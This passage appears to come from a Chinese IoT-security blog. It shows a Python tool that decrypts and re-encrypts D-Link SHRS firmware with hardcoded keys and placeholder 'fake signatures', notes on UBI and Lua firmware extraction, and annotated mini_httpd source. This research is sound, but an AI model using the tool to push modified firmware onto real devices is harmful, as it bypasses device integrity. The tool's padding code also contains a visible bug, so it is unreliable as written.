enc_fw.seek(CIPHERTEXT_OFF)</span><br><span class="line">            ciphertext = enc_fw.read(self.data_len_dec_fw_no_padding)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.ivec)</span><br><span class="line">        plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">        pathlib.Path(self.outp).open(<span class="string">"wb"</span>).write(plaintext)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_magic_bytes</span><span class="params">(self)</span>:</span></span><br><span class="line">        expected = <span class="string">b"SHRS"</span></span><br><span class="line">        actual = pathlib.Path(self.inp).open(<span class="string">"rb"</span>).read(<span class="number">4</span>)</span><br><span class="line">        print(<span class="string">"[*] Checking magic bytes..."</span>)</span><br><span class="line">        self.verify(actual, expected)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_datalen_variables</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(self.inp, <span class="string">"rb"</span>) <span class="keyword">as</span> enc_fw:</span><br><span class="line">            enc_fw.seek(DATA_LEN_DEC_FW_OFF)</span><br><span class="line">            self.data_len_dec_fw = int.from_bytes(enc_fw.read(DATA_LEN), byteorder=<span class="string">"big"</span>, signed=<span class="keyword">False</span>)</span><br><span class="line">            enc_fw.seek(DATALEN_DEC_FW_NO_PADDING_OFF)</span><br><span class="line">            self.data_len_dec_fw_no_padding = int.from_bytes(enc_fw.read(DATA_LEN), byteorder=<span class="string">"big"</span>, signed=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_ivec</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(self.inp, <span class="string">"rb"</span>) <span class="keyword">as</span> enc_fw:</span><br><span class="line">            enc_fw.seek(IVEC_OFF)</span><br><span class="line">            self.ivec = enc_fw.read(IVEC_LEN)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_key</span><span class="params">(self)</span>:</span></span><br><span class="line">        in_file = bytes.fromhex(<span class="string">"C8D32F409CACB347C8D26FDCB9090B3C"</span>)</span><br><span class="line">        user_key = bytes.fromhex(<span class="string">"358790034519F8C8235DB6492839A73F"</span>)</span><br><span class="line">        ivec = bytes.fromhex(<span class="string">"98C9D8F0133D0695E2A709C8B69682D4"</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[*] Calculating key..."</span>)</span><br><span class="line"></span><br><span class="line">        self.key = AES.new(user_key, AES.MODE_CBC, ivec).decrypt(in_file)</span><br><span class="line">        self.verify(self.key, bytes.fromhex(<span class="string">"C05FBF1936C99429CE2A0781F08D6AD8"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.verify_magic_bytes()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[*] Verifying SHA512 message digest of encrypted payload..."</span>)</span><br><span class="line">        md = self.calc_sha512_from_fd_at_offset_of_len(self.inp, CIPHERTEXT_OFF, self.data_len_dec_fw_no_padding)</span><br><span class="line">        expected_md = self.get_expected_sha512_from_fd_at_offset(self.inp, SHA512_ENC_FW)</span><br><span class="line">        self.verify(md, expected_md)</span><br><span class="line"></span><br><span class="line">        self.decrypt_aes128_cbc()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[*] Verifying SHA512 message digests of decrypted payload..."</span>)</span><br><span class="line">        md = self.calc_sha512_from_fd_at_offset_of_len(self.outp, <span class="number">0</span>, self.data_len_dec_fw)</span><br><span class="line">        expected_md = self.get_expected_sha512_from_fd_at_offset(self.inp, SHA512_DEC_FW)</span><br><span class="line">        self.verify(md, expected_md)</span><br><span class="line"></span><br><span class="line">        md = self.calc_sha512_from_fd_at_offset_of_len(self.outp, <span class="number">0</span>, self.data_len_dec_fw, key=self.key)</span><br><span class="line">        expected_md = self.get_expected_sha512_from_fd_at_offset(self.inp, SHA512_DEC_FW_W_KEY_OFF)</span><br><span class="line">        self.verify(md, expected_md)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">f'[+] Successfully decrypted "<span class="subst">&#123;pathlib.Path(self.inp).name&#125;</span>"!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># self.ivec can also be set to os.urandom(16) and encryption still works for arbitrary binaries.</span></span><br><span class="line">        <span class="comment"># 67..46 was chosen to handle original D-Link firmware files</span></span><br><span class="line">        self.ivec = bytes.fromhex(<span class="string">"67C6697351FF4AEC29CDBAABF2FBE346"</span>)</span><br><span class="line"></span><br><span class="line">        data = pathlib.Path(self.inp).read_bytes()</span><br><span class="line">        self.data_len_dec_fw_no_padding = len(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.data_len_dec_fw_no_padding % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            data += data + <span class="string">b"\x00"</span> * (<span class="number">16</span> - self.data_len_dec_fw_no_padding % <span class="number">16</span>)</span><br><span class="line">            self.data_len_dec_fw = len(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.data_len_dec_fw = self.data_len_dec_fw_no_padding</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[*] Calculating cipher..."</span>)</span><br><span class="line">        ciphert = AES.new(self.key, AES.MODE_CBC, self.ivec).encrypt(data)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[*] Building essential security header..."</span>)</span><br><span class="line">        sec_header = <span class="string">b"SHRS"</span></span><br><span class="line">        sec_header += struct.pack(<span class="string">"&gt;I"</span>, self.data_len_dec_fw_no_padding)</span><br><span class="line">        sec_header += struct.pack(<span class="string">"&gt;I"</span>, self.data_len_dec_fw)</span><br><span class="line">        sec_header += self.ivec</span><br><span class="line">        sec_header += bytes.fromhex(</span><br><span class="line">            self.calc_sha512_from_fd_at_offset_of_len(self.inp, <span class="number">0</span>, self.data_len_dec_fw_no_padding, key=self.key)</span><br><span class="line">        )</span><br><span class="line">        sec_header += bytes.fromhex(self.calc_sha512_from_fd_at_offset_of_len(self.inp, <span class="number">0</span>, self.data_len_dec_fw_no_padding))</span><br><span class="line">        sec_header += bytes.fromhex(hashlib.sha512(ciphert).hexdigest())</span><br><span class="line">        sec_header += <span class="string">b"\x00"</span> * <span class="number">512</span></span><br><span class="line">        sec_header += os.urandom(<span class="number">512</span>)  <span class="comment"># fake signature1, and</span></span><br><span class="line">        sec_header += os.urandom(<span class="number">512</span>)  <span class="comment"># fake signature2 as they're not needed for decryption..</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[*] Writing encrypted firmware to file..."</span>)</span><br><span class="line">        pathlib.Path(self.outp).write_bytes(sec_header + ciphert)</span><br><span class="line">        print(<span class="string">"\t[+] Done!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    arg_parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">"D-Link SHRS decyption tool"</span>, formatter_class=argparse.ArgumentDefaultsHelpFormatter</span><br><span class="line">    )</span><br><span class="line">    arg_parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--inp"</span>, type=str, help=<span class="string">"Path to the encrypted D-Link firmware image"</span>, required=<span class="keyword">True</span>)</span><br><span class="line">    arg_parser.add_argument(<span class="string">"-o"</span>, <span class="string">"--out"</span>, type=str, help=<span class="string">"Path to the decrypted firmware image"</span>, required=<span class="keyword">True</span>)</span><br><span class="line">    arg_parser.add_argument(</span><br><span class="line">        <span class="string">"-m"</span>, <span class="string">"--mode"</span>, type=str, default=<span class="string">"dec"</span>, choices=[<span class="string">"dec"</span>, <span class="string">"enc"</span>], help=<span class="string">"Choose whether to encrypt or decrypt"</span>,</span><br><span class="line">    )</span><br><span class="line">    cli_args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">    dlink = DcryptLink(cli_args.inp, cli_args.out, cli_args.mode)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dlink.run()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">with</span> suppress(FileNotFoundError):</span><br><span class="line">            pathlib.Path(dlink.outp).unlink()</span><br><span class="line">        print(<span class="string">"[!] Failed!"</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="05-ubi"><a href="#05-ubi" class="headerlink" title="05-ubi"></a>05-ubi</h2><ul>
<li>ubi提取方法</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">- ubi是文件系统，可以直接mount（未实践</span><br><span class="line">- ubidump：https://github.com/nlitsme/ubidump（实测失败</span><br><span class="line">- ubi_reader：https://github.com/jrspruitt/ubi_reader（实测成功</span><br></pre></td></tr></table></figure>
<ul>
<li>ubi_reader成功<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提取镜像</span></span><br><span class="line">ubireader_extract_images RBR750-V3.2.15.25_1.3.15-signed.chk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生ubifs-root目录，最终提取到三个镜像</span></span><br><span class="line">-rw-r--r-- 1 lxl lxl  5586944 Oct 12 14:18 img-1542134531_vol-kernel.ubifs</span><br><span class="line">-rw-r--r-- 1 lxl lxl        0 Oct 12 14:19 img-1542134531_vol-rootfs_data.ubifs</span><br><span class="line">-rw-r--r-- 1 lxl lxl 38219776 Oct 12 14:19 img-1542134531_vol-ubi_rootfs.ubifs</span><br><span class="line"></span><br><span class="line"><span class="comment"># file查看</span></span><br><span class="line">img-1542134531_vol-kernel.ubifs:      data</span><br><span class="line">img-1542134531_vol-rootfs_data.ubifs: empty</span><br><span class="line">img-1542134531_vol-ubi_rootfs.ubifs:  Squashfs filesystem, little endian, version 4.0, 38197684 bytes, 4437 inodes, blocksize: 262144 bytes, created: Wed May  6 11:35:42 2020</span><br><span class="line"><span class="comment"># 提取</span></span><br><span class="line">binwalk -Me或者直接unsquashfs img-1542134531_vol-ubi_rootfs.ubifs即可</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="06-lua"><a href="#06-lua" class="headerlink" title="06-lua"></a>06-lua</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># unluac失败</span></span><br><span class="line"> ~/.Trash/unluac  <span class="built_in">cd</span> ~/Documents/Tools/unluac</span><br><span class="line"> ~/Documents/Tools/unluac  ls</span><br><span class="line">README.md     authors.txt   build.sh      documentation license.txt   src           <span class="built_in">test</span></span><br><span class="line"> ~/Documents/Tools/unluac  ./build.sh</span><br><span class="line"> ~/Documents/Tools/unluac  ls</span><br><span class="line">README.md     authors.txt   bin           build         build.sh      documentation license.txt   src           <span class="built_in">test</span></span><br><span class="line"> ~/Documents/Tools/unluac  <span class="built_in">cd</span> bin</span><br><span class="line"> ~/Documents/Tools/unluac/bin  ls</span><br><span class="line">unluac.jar</span><br><span class="line"> ~/Documents/Tools/unluac/bin  java -jar unluac.jar /Users/lxl/Desktop/tp-c5400/fs_1/usr/lib/lua/luci/controller/login.lua &gt; login1.lua</span><br><span class="line">Exception <span class="keyword">in</span> thread <span class="string">"main"</span> java.lang.IllegalStateException: The input chunk reports an invalid code <span class="keyword">for</span> lua number integrality: 4</span><br><span class="line">	at unluac.parse.LHeaderType.parse_number_integrality(LHeaderType.java:127)</span><br><span class="line">	at unluac.parse.LHeaderType51.parse_main(LHeaderType.java:196)</span><br><span class="line">	at unluac.parse.LHeaderType.parse(LHeaderType.java:45)</span><br><span class="line">	at unluac.parse.BHeader.&lt;init&gt;(BHeader.java:66)</span><br><span class="line">	at unluac.Main.file_to_function(Main.java:71)</span><br><span class="line">	at unluac.Main.main(Main.java:42)</span><br><span class="line"> ✘ ~/Documents/Tools/unluac/bin </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># luadec失败</span></span><br><span class="line"><span class="comment"># openwrt不同于默认的lua 字节码</span></span><br><span class="line">lxl@localhost  ~/Documents/Tools  git <span class="built_in">clone</span> https://github.com/viruscamp/luadec</span><br><span class="line"></span><br><span class="line">lxl@localhost  ~/Documents/Tools  <span class="built_in">cd</span> luadec</span><br><span class="line"></span><br><span class="line">lxl@localhost  ~/Documents/Tools/luadec   master  git submodule update --init lua-5.1</span><br><span class="line"></span><br><span class="line">lxl@ubuntu:/mnt/hgfs$ <span class="built_in">cd</span> luadec/lua-5.1/</span><br><span class="line"></span><br><span class="line">lxl@ubuntu:/mnt/hgfs/luadec/lua-5.1$ sudo apt install libreadline-dev</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/luadec/lua-5.1$ make linux</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/luadec/lua-5.1$ <span class="built_in">cd</span> ../luadec</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/luadec/luadec$ make LUAVER=5.1</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/luadec$ <span class="built_in">cd</span> luadec/</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/luadec/luadec$ ./luadec </span><br><span class="line"></span><br><span class="line">./luadec /mnt/hgfs/mac/tp-c5400/fs_1/usr/lib/lua/luci/controller/login.lua </span><br><span class="line">./luadec: /mnt/hgfs/mac/tp-c5400/fs_1/usr/lib/lua/luci/controller/login.lua: bad code <span class="keyword">in</span> precompiled chunk</span><br><span class="line"></span><br><span class="line"><span class="comment"># luadec-tplink 成功,但没符号</span></span><br><span class="line"> lxl@localhost  ~/Documents/Tools/luadec-tplink-master/OSX-Compiled  ./luadec ~/Desktop/tp-c5400/fs_1/usr/lib/lua/luci/controller/login.lua</span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="加载基址"><a href="#加载基址" class="headerlink" title="加载基址"></a>加载基址</h2><h3 id="rbasefind"><a href="#rbasefind" class="headerlink" title="rbasefind"></a>rbasefind</h3><p><a href="https://github.com/sgayou/rbasefind" target="_blank" rel="noopener">https://github.com/sgayou/rbasefind</a><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译:</span></span><br><span class="line">https://szpzs.oschina.io/2019/10/29/executable-program-in-rust/</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">brew install rust</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="built_in">cd</span> rbasefind-master</span><br><span class="line">cargo build --release</span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">ls target/release/rbasefind</span><br></pre></td></tr></table></figure></p>
<h3 id="ppc-rebase"><a href="#ppc-rebase" class="headerlink" title="ppc_rebase"></a>ppc_rebase</h3><ul>
<li>usage：python2 ppc_rebase.py firmware.bin</li>
</ul>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>固件解密</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式设备web服务器-mini_httpd</title>
    <url>/2021/02/08/iot/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87web%E6%9C%8D%E5%8A%A1%E5%99%A8-mini_httpd/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="version-1-30"><a href="#version-1-30" class="headerlink" title="version_1.30"></a>version_1.30</h1><h2 id="handle-request（main-call"><a href="#handle-request（main-call" class="headerlink" title="handle_request（main call"></a>handle_request（main call</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This runs in a child process, and exits when done, so cleanup is</span></span><br><span class="line"><span class="comment">** not needed.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_request</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* method_str;<span class="comment">// 请求方法字符串</span></span><br><span class="line">    <span class="keyword">char</span>* line;</span><br><span class="line">    <span class="keyword">char</span>* cp;</span><br><span class="line">    <span class="keyword">int</span> r, file_len, i;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* index_names[] = &#123;</span><br><span class="line">	<span class="string">"index.html"</span>, <span class="string">"index.htm"</span>, <span class="string">"index.xhtml"</span>, <span class="string">"index.xht"</span>, <span class="string">"Default.htm"</span>,</span><br><span class="line">	<span class="string">"index.cgi"</span> &#125;;<span class="comment">// ????</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置读取超时</span></span><br><span class="line">    <span class="comment">/* Set up the timeout for reading. */</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SIGSET</span></span><br><span class="line">    (<span class="keyword">void</span>) sigset( SIGALRM, handle_read_timeout );</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* HAVE_SIGSET */</span></span></span><br><span class="line">    (<span class="keyword">void</span>) signal( SIGALRM, handle_read_timeout );</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_SIGSET */</span></span></span><br><span class="line">    (<span class="keyword">void</span>) alarm( READ_TIMEOUT );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 初始化请求相关的变量</span></span><br><span class="line">    <span class="comment">/* Initialize the request variables. */</span></span><br><span class="line">    remoteuser = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    method = METHOD_UNKNOWN;</span><br><span class="line">    path = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    file = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    pathinfo = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    query = <span class="string">""</span>;</span><br><span class="line">    protocol = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    status = <span class="number">0</span>;</span><br><span class="line">    bytes = <span class="number">-1</span>;</span><br><span class="line">    req_hostname = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 请求头对应的变量</span></span><br><span class="line">    authorization = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    content_type = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    content_length = <span class="number">-1</span>;</span><br><span class="line">    cookie = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    host = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    if_modified_since = (<span class="keyword">time_t</span>) <span class="number">-1</span>;</span><br><span class="line">    referrer = <span class="string">""</span>;</span><br><span class="line">    useragent = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置socket选项</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> TCP_NOPUSH</span></span><br><span class="line">    <span class="keyword">if</span> ( ! do_ssl )</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">/* Set the TCP_NOPUSH socket option, to try and avoid the 0.2 second</span></span><br><span class="line"><span class="comment">	** delay between sending the headers and sending the data.  A better</span></span><br><span class="line"><span class="comment">	** solution is writev() (as used in thttpd), or send the headers with</span></span><br><span class="line"><span class="comment">	** send(MSG_MORE) (only available in Linux so far).</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	r = <span class="number">1</span>;</span><br><span class="line">	(<span class="keyword">void</span>) setsockopt(</span><br><span class="line">	    conn_fd, IPPROTO_TCP, TCP_NOPUSH, (<span class="keyword">void</span>*) &amp;r, <span class="keyword">sizeof</span>(r) );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* TCP_NOPUSH */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// ssl相关</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> USE_SSL</span></span><br><span class="line">    <span class="keyword">if</span> ( do_ssl )</span><br><span class="line">	&#123;</span><br><span class="line">	ssl = SSL_new( ssl_ctx );</span><br><span class="line">	SSL_set_fd( ssl, conn_fd );</span><br><span class="line">	<span class="keyword">if</span> ( SSL_accept( ssl ) == <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    ERR_print_errors_fp( <span class="built_in">stderr</span> );</span><br><span class="line">	    finish_request( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Read in the request. */</span></span><br><span class="line">    start_request();<span class="comment">// request size和idx初始化为0</span></span><br><span class="line">    <span class="keyword">for</span> (;;)	</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">50000</span>];</span><br><span class="line">		<span class="keyword">int</span> rr = my_read( buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span> );<span class="comment">// 从socket中读取数据到buf</span></span><br><span class="line">		<span class="keyword">if</span> ( rr &lt; <span class="number">0</span> &amp;&amp; ( errno == EINTR || errno == EAGAIN ) )</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span> ( rr &lt;= <span class="number">0</span> )</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		(<span class="keyword">void</span>) alarm( READ_TIMEOUT );</span><br><span class="line">		add_to_request( buf, rr );<span class="comment">// 调用add_data，将buf添加到全局变量request</span></span><br><span class="line">		<span class="keyword">if</span> ( <span class="built_in">strstr</span>( request, <span class="string">"\015\012\015\012"</span> ) != (<span class="keyword">char</span>*) <span class="number">0</span> ||<span class="built_in">strstr</span>( request, <span class="string">"\012\012"</span> ) != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 解析请求的第一行：方法、路径、协议</span></span><br><span class="line">    <span class="comment">/* Parse the first line of the request. */</span></span><br><span class="line">    method_str = get_request_line();<span class="comment">// 第一次调用，获取请求行</span></span><br><span class="line">    <span class="keyword">if</span> ( method_str == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">		send_error( <span class="number">400</span>, <span class="string">"Bad Request"</span>, <span class="string">""</span>, <span class="string">"Can't parse request."</span> );</span><br><span class="line">    path = <span class="built_in">strpbrk</span>( method_str, <span class="string">" \t\012\015"</span> );<span class="comment">// 获取path</span></span><br><span class="line">    <span class="keyword">if</span> ( path == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">		send_error( <span class="number">400</span>, <span class="string">"Bad Request"</span>, <span class="string">""</span>, <span class="string">"Can't parse request."</span> );</span><br><span class="line">    *path++ = <span class="string">'\0'</span>;</span><br><span class="line">    path += <span class="built_in">strspn</span>( path, <span class="string">" \t\012\015"</span> );</span><br><span class="line">    protocol = <span class="built_in">strpbrk</span>( path, <span class="string">" \t\012\015"</span> );<span class="comment">// 获取协议，如HTTP/1.1</span></span><br><span class="line">    <span class="keyword">if</span> ( protocol == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">		send_error( <span class="number">400</span>, <span class="string">"Bad Request"</span>, <span class="string">""</span>, <span class="string">"Can't parse request."</span> );</span><br><span class="line">    *protocol++ = <span class="string">'\0'</span>;</span><br><span class="line">    protocol += <span class="built_in">strspn</span>( protocol, <span class="string">" \t\012\015"</span> );</span><br><span class="line">    query = <span class="built_in">strchr</span>( path, <span class="string">'?'</span> );<span class="comment">// 获取请求参数</span></span><br><span class="line">    <span class="keyword">if</span> ( query == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">		query = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">		*query++ = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 解析剩下的内容，即处理各种请求头，并赋值给相应的全局变量</span></span><br><span class="line">    <span class="comment">/* Parse the rest of the request headers. */</span></span><br><span class="line">    <span class="keyword">while</span> ( ( line = get_request_line() ) != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ( line[<span class="number">0</span>] == <span class="string">'\0'</span> )</span><br><span class="line">	    	<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"Authorization:"</span>, <span class="number">14</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">14</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			authorization = cp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"Content-Length:"</span>, <span class="number">15</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">15</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			content_length = atol( cp );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"Content-Type:"</span>, <span class="number">13</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">13</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			content_type = cp;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"Cookie:"</span>, <span class="number">7</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">7</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			cookie = cp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"Host:"</span>, <span class="number">5</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">5</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			host = cp;</span><br><span class="line">			<span class="keyword">if</span> ( host[<span class="number">0</span>] == <span class="string">'\0'</span> || host[<span class="number">0</span>] == <span class="string">'.'</span> ||<span class="built_in">strchr</span>( host, <span class="string">'/'</span> ) != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">				send_error( <span class="number">400</span>, <span class="string">"Bad Request"</span>, <span class="string">""</span>, <span class="string">"Can't parse request."</span> );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"If-Modified-Since:"</span>, <span class="number">18</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">18</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			if_modified_since = tdate_parse( cp );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"Referer:"</span>, <span class="number">8</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">8</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			referrer = cp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"Referrer:"</span>, <span class="number">9</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">9</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			referrer = cp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">"User-Agent:"</span>, <span class="number">11</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			cp = &amp;line[<span class="number">11</span>];</span><br><span class="line">			cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t"</span> );</span><br><span class="line">			useragent = cp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 判定method、一个数字对应一个请求方法</span></span><br><span class="line">    <span class="keyword">if</span> ( strcasecmp( method_str, get_method_str( METHOD_GET ) ) == <span class="number">0</span> )</span><br><span class="line">		method = METHOD_GET;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( method_str, get_method_str( METHOD_HEAD ) ) == <span class="number">0</span> )</span><br><span class="line">		method = METHOD_HEAD;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( method_str, get_method_str( METHOD_POST ) ) == <span class="number">0</span> )</span><br><span class="line">		method = METHOD_POST;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( method_str, get_method_str( 